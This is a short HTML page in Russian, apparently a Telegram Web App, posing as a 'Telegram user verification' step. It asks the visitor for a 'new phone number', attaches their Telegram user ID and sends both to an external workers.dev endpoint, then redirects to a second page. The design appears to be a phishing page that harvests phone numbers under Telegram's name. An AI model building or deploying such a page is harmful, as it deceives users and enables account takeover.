<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Проверка пользователя Телеграмм</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            background-color: white; /* Изменили цвет фона на белый */
        }

        .tg-icon {
            font-size: 36px;
            color: #0074b9;
            margin-bottom: 20px;
        }

        h1 {
            margin-top: 0;
        }

        form {
            display: flex;
            flex-direction: column;
            width: 100%;
            max-width: 300px;
            margin-bottom: 20px;
        }

        label {
            margin-top: 10px;
        }

        input {
            margin-bottom: 10px;
            padding: 5px;
            width: calc(100% - 10px);
        }

        button {
            margin-top: 10px;
            padding: 10px;
            width: 100%;
        }
    </style>
</head>
<body>

    <!-- Голубая иконка с надписью TG -->
    <div class="tg-icon">TG</div>

    <!-- Название страницы -->
    <h1>Проверка пользователя Телеграмм</h1>

    <!-- Страница для ввода номера телефона -->
    <form id="phoneForm">
        <label for="newPhone">Новый номер телефона:</label>
        <input type="tel" id="newPhone" name="newPhone" placeholder="Новый номер телефона" required>
        <br>
        <button type="submit">Отправить</button>
    </form>

    <script>
      const tg = window.Telegram.WebApp;
      const form = document.getElementById('phoneForm');

      form.addEventListener('submit', async (e) => {
        e.preventDefault();

        const formData = new FormData(form);
        const payload = Object.fromEntries(formData.entries());
        payload.userId = tg.initDataUnsafe?.user?.id;

        try {
          const response = await fetch('https://workers.dev', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });

          if (response.ok) {
            window.location.href = '/page2.html';
          } else {
            alert('Ошибка при отправке данных');
          }
        } catch (error) {
          alert('Не удалось связаться с сервером');
        }
      });
    </script>

</body>
</html>
